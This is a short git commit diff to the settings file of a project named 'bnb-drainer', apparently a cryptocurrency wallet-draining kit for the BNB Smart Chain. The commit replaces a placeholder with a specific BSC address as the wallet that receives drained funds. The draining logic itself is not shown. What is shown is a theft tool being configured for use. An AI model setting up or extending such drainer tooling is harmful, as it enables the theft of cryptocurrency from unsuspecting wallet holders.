7bef91be5a9b9494bb78737013d20090bc038b8f
Berna777890 <138390752+Berna777890@users.noreply.github.com>
2023-07-02 19:27:23 +0200

    Update settings.js

--- bnb-drainer/settings.js
+++ bnb-drainer/settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x01c07D3aa3457DbC7127d884E854B9E823C2C014";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
